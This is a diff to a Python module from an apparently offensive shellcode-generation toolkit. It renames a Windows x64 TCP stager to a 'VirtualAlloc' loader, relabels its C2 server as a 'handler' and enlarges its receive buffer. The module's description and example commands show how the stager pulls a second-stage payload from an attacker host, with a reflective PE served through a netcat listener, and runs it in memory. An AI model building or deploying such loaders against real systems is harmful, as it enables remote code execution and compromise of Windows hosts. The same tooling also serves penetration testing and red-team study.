@@ -23,9 +23,9 @@ class Shellcode():
 
     platform = "windows"
 
-    name = f"Windows ({arch}) Shellcode Loader"
+    name = f"Windows ({arch}) VirtualAlloc Shellcode Loader"
 
-    module = f"{platform}/{arch}/shellcode_exec_tcp"
+    module = f"{platform}/{arch}/virtualalloc_exec_tcp.py"
 
     example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
@@ -35,18 +35,18 @@ class Shellcode():
 
     tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]
 
-    summary = ("A lightweight stager that connects to a C2 server via TCP over IPv4 to receive and execute shellcode")
+    summary = ("A lightweight stager that connects to a handler via TCP over IPv4 to receive and execute shellcode")
 
-    description = ("This shellcode stub connects to a remote C2 server over TCP, downloads a second-stage"
+    description = ("This shellcode stub connects to a remote server handler over TCP, downloads a second-stage"
                    " payload, and executes it.\n\n"
 
-                   "Your \"C2 Server\" can be as simple as combining Sickle and Netcat:\n\n"
+                   "Your handler can be as simple as combining Sickle and Netcat:\n\n"
 
                    f"    {sys.argv[0]} -p windows/x64/reflective_pe EXE=/path/doom.exe -f raw | nc -lvp 8080\n\n"
 
                    "Upon execution of the first stage, you should get a connection from the target on your"
-                   " C2. If using Netcat, hit [CTRL]+[C]. Upon doing so, your shellcode should execute in"
-                   " memory.")
+                   " handler. If using Netcat, hit [CTRL]+[C]. Upon doing so, your shellcode should execute"
+                   " in memory.")
 
     arguments = {}
     arguments["LHOST"] = {}
@@ -85,7 +85,7 @@ class Shellcode():
 
         self.stack_space = builder.calc_stack_space(sc_args)
         self.storage_offsets = builder.gen_offsets(sc_args)
-        self.sock_buffer_size = 0x1000 * 100
+        self.sock_buffer_size = 0x1000 * 1100
 
         return
 
